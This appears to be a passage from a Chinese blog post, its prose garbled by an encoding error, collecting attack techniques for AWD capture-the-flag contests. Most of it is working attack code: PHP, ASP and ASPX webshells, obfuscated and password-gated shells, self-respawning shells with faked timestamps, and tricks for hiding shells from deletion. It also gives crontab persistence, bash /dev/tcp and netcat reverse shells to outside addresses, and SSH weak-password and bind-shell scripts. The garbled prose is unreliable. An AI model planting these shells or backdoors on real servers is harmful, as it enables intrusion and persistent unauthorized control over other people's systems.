·çš„ï¼Œä¹Ÿå¯ä»¥çœ‹å·±æ–¹é¶æœºå¼€æ”¾äº†å“ªäº›ç«¯å£ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€äº›æœåŠ¡ç«¯å£çš„æ¼æ´ï¼š</p><p>22ï¼šsshå¼±å£ä»¤</p><p>873ï¼šæœªæˆæƒè®¿é—®æ¼æ´</p><p>3306ï¼šmysqlå¼±å£ä»¤</p><p>6379ï¼šredisæœªæˆæƒè®¿é—®æ¼æ´</p><h1 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><p>ä¿¡æ¯æ”¶é›†</p><ul><li>nmapã€Routescan</li><li>Python è„šæœ¬</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for x in range(2,255):</span><br><span class="line">    url = &quot;&lt;http://192.168.1&gt;.&#123;&#125;&quot;.format(x)</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url)</span><br><span class="line">        print(url)</span><br><span class="line">        except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h2 id="åé—¨åˆ©ç”¨"><a href="#åé—¨åˆ©ç”¨" class="headerlink" title="åé—¨åˆ©ç”¨"></a>åé—¨åˆ©ç”¨</h2><p>curlè¯»flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\\Users\\admin&gt;curl &quot;&lt;http://192.168.182.130:8801/include/shell.php&gt;&quot; -d &quot;admin_ccmd=system(&#x27;cat /f*&#x27;);&quot;</span><br><span class="line">SL&#123;4a0be463dd85555090f2216795677916d2447242&#125;</span><br><span class="line">flag&#123;glzjin_wants_a_girl_friend&#125;</span><br></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ç«¯å£</span><br><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">url_head=&quot;&lt;http://192.168.182.130&gt;&quot;   #ç½‘æ®µ</span><br><span class="line">url=&quot;&quot;</span><br><span class="line">shell_addr=&quot;/upload/url/shell.php&quot; #æœ¨é©¬è·¯å¾„</span><br><span class="line">passwd=&quot;pass&quot;                   #æœ¨é©¬å¯†ç </span><br><span class="line">#port=&quot;80&quot;</span><br><span class="line">payload = &#123;passwd: &#x27;System(\\&#x27;cat /flag\\&#x27;);&#x27;&#125;</span><br><span class="line"># find / -name &quot;flag*&quot;</span><br><span class="line"></span><br><span class="line">#æ¸…ç©ºä¸Šæ¬¡è®°å½•</span><br><span class="line">flag=open(&quot;flag.txt&quot;,&quot;w&quot;)</span><br><span class="line">flag.close()</span><br><span class="line"></span><br><span class="line">flag=open(&quot;flag.txt&quot;,&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(8000,8004):</span><br><span class="line">    url=url_head+&quot;:&quot;+str(i)+shell_addr</span><br><span class="line">    try:</span><br><span class="line">        res=requests.post(url,payload)#,timeout=1</span><br><span class="line">        if res.status_code == requests.codes.ok:</span><br><span class="line">            result = res.text</span><br><span class="line">            print (result)</span><br><span class="line">            flag.write(result+&quot;\\n&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print (&quot;shell 404&quot;)</span><br><span class="line">    except:</span><br><span class="line">        print (url+&quot; connect shell fail&quot;)</span><br><span class="line"></span><br><span class="line">flag.close()</span><br></pre></td></tr></table></figure><h2 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a>ä¸€å¥è¯æœ¨é©¬</h2><p>å¸¸ç”¨è¯­è¨€çš„ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpï¼š &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;      &lt;?php eval($_GET[&#x27;pass&#x27;]);</span><br><span class="line">aspï¼š   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspxï¼š  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥getå‹æœ¨é©¬ï¼Œä¹‹å‰ä¸€ç›´ä¸ä¼šç”¨èšå‰‘è¿æ¥getå‹æœ¨é©¬ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#x27;pass&#x27;]);</span><br><span class="line"></span><br><span class="line">/shell.php?pass=eval($_POST[1]);</span><br><span class="line">è¿æ¥å¯†ç ï¼š1</span><br></pre></td></tr></table></figure><h2 id="éšè—shell"><a href="#éšè—shell" class="headerlink" title="éšè—shell"></a>éšè—shell</h2><p>shellå¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œè¢«åˆ é™¤å°±ggäº†ï¼Œå¯ä»¥é‡‡ç”¨ä¸€äº›æ“ä½œéšè—shellæˆ–ä½¿shellæ— æ³•è¢«åˆ é™¤</p><p><strong>1.æŠŠshell.phpå‘½åä¸º.shell.php</strong></p><p>.shell.phpåœ¨æ‰§è¡Œlsæ—¶æ— æ³•è¢«æŸ¥çœ‹åˆ°ï¼Œæ­é…lsçš„å‚æ•°æ‰èƒ½è¢«å‘ç°</p><p>å®Œæ•´å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[sss@ecs-centos-7 awd]$ echo &quot;iamshell&quot;&gt;shell.php</span><br><span class="line">[sss@ecs-centos-7 awd]$ ls</span><br><span class="line">shell.php</span><br><span class="line">[sss@ecs-centos-7 awd]$ mv shell.php .shell.php</span><br><span class="line">[sss@ecs-centos-7 awd]$ ls</span><br><span class="line">[sss@ecs-centos-7 awd]$ ls -al</span><br><span class="line">æ€»ç”¨é‡ 12</span><br><span class="line">drwxrwxr-x 2 sss sss 4096 12æœˆ  29 22:52 .</span><br><span class="line">drwx------ 4 sss sss 4096 12æœˆ  29 22:51 ..</span><br><span class="line">-rw-rw-r-- 1 sss sss    9 12æœˆ  29 22:52 .shell.php</span><br></pre></td></tr></table></figure><p><strong>2.æŠŠshell.phpå‘½åä¸º-shell.php</strong></p><p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼ŒlsåŠ å‚æ•°æ‰èƒ½æŸ¥çœ‹åˆ°shellï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å†™ä¸€ä¸ª-shell.phpã€</p><p>å‘½ä»¤è¡Œä¼šæŠŠ-åé¢çš„å†…å®¹å½“æˆå‚æ•°æ‰§è¡Œï¼Œæ‰§è¡Œå³ä½¿è¢«å‘ç°ï¼Œä½¿ç”¨rmå‘½ä»¤è¿›è¡Œåˆ é™¤ï¼Œä¼šè¢«å½“æˆæ˜¯rmçš„å‚æ•°ï¼Œå°±ä¼šå‘ç”ŸæŠ¥é”™ï¼Œæ— æ³•åˆ é™¤shellï¼Œç›®çš„ä¹Ÿè¾¾åˆ°äº†</p><p>å®Œæ•´å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[sss@ecs-centos-7 awd]$ ls</span><br><span class="line">-shell.php</span><br><span class="line">[sss@ecs-centos-7 awd]$ rm -shell.php</span><br><span class="line">rmï¼šæ— æ•ˆé€‰é¡¹ -- s</span><br><span class="line">Try &#x27;rm ./-shell.php&#x27; to remove the file &quot;-shell.php&quot;.</span><br><span class="line">Try &#x27;rm --help&#x27; for more information.</span><br><span class="line">[sss@ecs-centos-7 awd]$ rm -rf -shell.php</span><br><span class="line">rmï¼šæ— æ•ˆé€‰é¡¹ -- s</span><br><span class="line">Try &#x27;rm ./-shell.php&#x27; to remove the file &quot;-shell.php&quot;.</span><br><span class="line">Try &#x27;rm --help&#x27; for more information.</span><br></pre></td></tr></table></figure><h2 id="ç‰¹æ®Šçš„shell"><a href="#ç‰¹æ®Šçš„shell" class="headerlink" title="ç‰¹æ®Šçš„shell"></a>ç‰¹æ®Šçš„shell</h2><p>shell1ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</span><br></pre></td></tr></table></figure><p>è¿æ¥æ–¹å¼ï¼šphp?2=assertå¯†ç æ˜¯1ã€‚</p><p>shell2ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=chr( 96^5);</span><br><span class="line">$b=chr( 57^79);</span><br><span class="line">$c=chr( 15^110);</span><br><span class="line">$d=chr( 58^86);</span><br><span class="line">$e= &#x27;($_REQUEST[C])&#x27;;</span><br><span class="line">@assert($a.$b.$c.$d.$e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é…ç½®ä¸º?b=))99(rhC(tseuqeR+lave</p><p>shell3ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sF= &quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&#x27;n985de9&#x27;];if(isset($s22))&#123;eval($s21($s22));&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é…ç½®å¡«n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</p><p>è¿æ¥å¯†ç :0ï¼ˆé›¶ï¼‰</p><p>shell4ï¼šMD5æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(md5($_POST[&#x27;pass&#x27;])==&#x27;d8d1a1efe0134e2530f503028a825253&#x27;)</span><br><span class="line">@eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>shell5ï¼šMD5æœ¨é©¬+åˆ©ç”¨header</p><p>2021ISCCæ²³å—èµ›åŒºçº¿ä¸‹èµ›å°±æ˜¯è¿™ç§shellï¼Œå½“æ—¶å·®ç‚¹æ²¡çœ‹å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#x27;hello&#x27;;</span><br><span class="line">if(md5($_POST[&#x27;pass&#x27;])==&#x27;d8d1a1efe0134e2530f503028a825253&#x27;)</span><br><span class="line">if (@$_SERVER[&#x27;HTTP_USER_AGENT&#x27;] == &#x27;flag&#x27;)&#123;</span><br><span class="line">$test= &#x27;flag&#x27;;</span><br><span class="line">header(&quot;flag:$test&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="ä¸æ­»é©¬"><a href="#ä¸æ­»é©¬" class="headerlink" title="ä¸æ­»é©¬"></a>ä¸æ­»é©¬</h2><p>ä¸æ­»é©¬ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &#x27;shell.php&#x27;;</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&#x27;cmd&#x27;]);&#125; ?&gt;&#x27;;</span><br><span class="line">while (1)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#x27;);</span><br><span class="line">    usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#passwd=y0range857</span><br><span class="line">#POSTä¼ å‚ï¼špasswd=y0range857&amp;a=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åè¿›è¡Œè®¿é—®ï¼Œä¼šåœ¨è¯¥è·¯å¾„ä¸‹ä¸€ç›´ç”Ÿæˆä¸€ä¸ªåå­—ä¸ºshell2.phpçš„shellæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨caidaoè¾“å…¥<a href="http://xxx/shell2.php?pass=pass%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%93%BE%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%8C%E7%94%B1%E4%BA%8Epass%E6%98%AFmd5%E5%8A%A0%E5%AF%86%E5%BE%88%E9%9A%BE%E8%A2%AB%E7%A0%B4%E8%A7%A3%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%88%B0%E9%9A%90%E8%94%BD,md5%E5%80%BC%E5%8F%AF%E4%BB%A5%E9%9A%8F%E6%84%8F%E5%AE%9A%E4%B9%89%E3%80%82">http://xxx/shell2.php?pass=passçš„è·¯å¾„ï¼Œå¯†ç ä¸ºaå°±å¯ä»¥é“¾æ¥ä¸€å¥è¯ï¼Œç”±äºpassæ˜¯md5åŠ å¯†å¾ˆéš¾è¢«ç ´è§£ä¹Ÿå¯ä»¥åšåˆ°éšè”½,md5å€¼å¯ä»¥éšæ„å®šä¹‰ã€‚</a></p><p>å†™å…¥shellï¼Œ at.phpå†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &#x27;.login.php&#x27;;</span><br><span class="line">$file1 = &#x27;/admin/.register.php&#x27;;</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#x27;;</span><br><span class="line">while (1)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#x27;);</span><br><span class="line">    file_put_contents($file1,$code);</span><br><span class="line">    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#x27;);</span><br><span class="line">    usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨è®¿é—®at.phpï¼Œä¼šç”Ÿæˆä¸æ­»é©¬at2.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/upload/at.php</span><br></pre></td></tr></table></figure><p>å†ä¼ å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œgetshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/upload/at2.php?passwd=obse007&amp;at=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><p>é¢„ç•™åé—¨çš„æƒé™ç»´æŒç‰¹åˆ«é‡è¦ï¼Œä¸è¦æ€¥ç€æ‹¿flagï¼Œå¾€åæ¯ä¸€è½®é¢„ç•™åé—¨éƒ½ä¼šå‡å°‘ï¼Œæœªé›¨ç»¸ç¼ªã€‚</p><p><strong>crontabå®šæ—¶ä»»åŠ¡</strong></p><p>1.ä½¿ç”¨å®šæ—¶ä»»åŠ¡å†™é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;echo &quot;* * * * * echo \\&quot;&lt;?php  if(md5(\\\\\\\\\\\\\\\\\\$_POST[pass])==\\&#x27;462d4a0e7cedd6b024a4d99f10c614d1\\&#x27;)&#123;@eval(\\\\\\\\\\\\\\\\\\$_POST[1]);&#125;  \\&quot; &gt; /var/www/html/.index.php\\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&#x27;);</span><br></pre></td></tr></table></figure><p>å¯†ç ï¼šatkx</p><p>æ¥æŒ‡å®šç”¨æˆ·è¿è¡ŒæŒ‡å®šçš„å®šæ—¶ä»»åŠ¡</p><p>2.ä½¿ç”¨å®šæ—¶ä»»åŠ¡å‘é€å¸¦æœ‰flagçš„è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash# ç¼–è¾‘ crontabï¼šcrontab -e</span><br><span class="line">*/5 * * * * curl 10.10.10.5:8000/submit_flag/ -d &#x27;flag=&#x27;$(cat /home/web/flag/flag)&#x27;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#x27;</span><br><span class="line"># æŸ¥è¯¢ crontabï¼šcrontab -l</span><br></pre></td></tr></table></figure><p>3.ä½¿ç”¨å®šæ—¶ä»»åŠ¡åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c bash&#x27;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#x27;</span><br><span class="line"></span><br><span class="line">nc -e /bin/bash 1.3.3.7 4444 bash</span><br></pre></td></tr></table></figure><p><strong>åå¼¹shell</strong></p><p>ncåå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.182.130/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>æœ¬åœ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 6666</span><br></pre></td></tr></table></figure><h2 id="è½¯é“¾æ¥"><a href="#è½¯é“¾æ¥" class="headerlink" title="è½¯é“¾æ¥"></a>è½¯é“¾æ¥</h2><p>è½¯è¿æ¥è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s  [shellè·¯å¾„]   [æ–°æ–‡ä»¶è·¯å¾„]</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><p>è®¿é—®/upload/new.phpï¼Œå®é™…ä¸Šæ˜¯è®¿é—®/upload/shell.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php</span><br></pre></td></tr></table></figure><p>è½¯è¿æ¥åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css</span><br><span class="line">root@086f12c38b93:~# cat /var/www/html/css/flag.css</span><br><span class="line">SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®url/css/flag.csså³å¯å¾—åˆ°flag</p><h2 id="SSHå¼±å¯†ç åˆ©ç”¨"><a href="#SSHå¼±å¯†ç åˆ©ç”¨" class="headerlink" title="SSHå¼±å¯†ç åˆ©ç”¨"></a>SSHå¼±å¯†ç åˆ©ç”¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import paramiko</span><br><span class="line">ip = &#x27;192.168.1.137&#x27;</span><br><span class="line">port = &#x27;22&#x27;</span><br><span class="line">username = &#x27;root&#x27;</span><br><span class="line">passwd = &#x27;123456&#x27;</span><br><span class="line"># ssh ç”¨æˆ·å å¯†ç  ç™»é™†</span><br><span class="line">def ssh_base_pwd(ip,port,username,passwd,cmd=&#x27;cat /flag&#x27;):</span><br><span class="line">    port = int(port)</span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    ssh.connect(hostname=ip, port=port, username=username, password=passwd)</span><br><span class="line">    stdin,stdout,stderr = ssh.exec_command(cmd)</span><br><span class="line">    result = stdout.read()</span><br><span class="line">    if not result :</span><br><span class="line">        print(&quot;æ— ç»“æœ!&quot;)</span><br><span class="line">        result = stderr.read()</span><br><span class="line">    ssh.close()</span><br><span class="line">    return result.decode()</span><br><span class="line">a = ssh_base_pwd(ip,port,username,passwd)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">#SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;</span><br></pre></td></tr></table></figure><p>æ‰¹é‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import paramiko</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import time</span><br><span class="line">#åå¼¹shell python</span><br><span class="line">q=queue.Queue()</span><br><span class="line">#lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"># ssh ç”¨æˆ·å å¯†ç  ç™»é™†</span><br><span class="line">def ssh_base_pwd(ip,port,username,passwd,cmd):</span><br><span class="line">    port = int(port)</span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    ssh.connect(hostname=ip, port=port, username=username, password=passwd)</span><br><span class="line">    stdin,stdout,stderr = ssh.exec_command(cmd)</span><br><span class="line">    result = stdout.read()</span><br><span class="line">    if not result :</span><br><span class="line">        result = stderr.read()</span><br><span class="line">    ssh.close()</span><br><span class="line">    return result.decode()</span><br><span class="line"></span><br><span class="line">def main(x):</span><br><span class="line">    shell = &#x27;&#x27;&#x27;</span><br><span class="line">    #æœåŠ¡å™¨ç«¯</span><br><span class="line">    import socket</span><br><span class="line">    import os</span><br><span class="line">    s=socket.socket()   #åˆ›å»ºå¥—æ¥å­— #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.bind((&#x27;0.0.0.0&#x27;,1234))    #ç»‘å®šåœ°å€å’Œç«¯å£#0.0.0.0æ¥æ”¶ä»»æ„å®¢æˆ·ç«¯ipè¿æ¥</span><br><span class="line">    s.listen(5)                 #è°ƒç”¨listenæ–¹æ³•å¼€å§‹ç›‘å¬ç«¯å£ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºç­‰å¾…è¿æ¥çš„æœ€å¤§æ•°é‡</span><br><span class="line">    con,addr=s.accept()     #æ¥å—ä¸€ä¸ªå®¢æˆ·ç«¯çš„è¿æ¥</span><br><span class="line">    #print(con,addr)</span><br><span class="line">    for i in range(10):</span><br><span class="line">        cmd=con.recv(1024)</span><br><span class="line">        print(cmd)</span><br><span class="line">        command=cmd.decode()</span><br><span class="line">        if command.startswith(&#x27;cd&#x27;):</span><br><span class="line">            os.chdir(command[2:].strip())   #åˆ‡æ¢è·¯å¾„</span><br><span class="line">            result=os.getcwd()      #æ˜¾ç¤ºè·¯å¾„</span><br><span class="line">        else:</span><br><span class="line">            result=os.popen(command).read()</span><br><span class="line">        if result:</span><br><span class="line">            con.send(result.encode())</span><br><span class="line">        else:</span><br><span class="line">            con.send(b&#x27;OK!&#x27;)</span><br><span class="line">    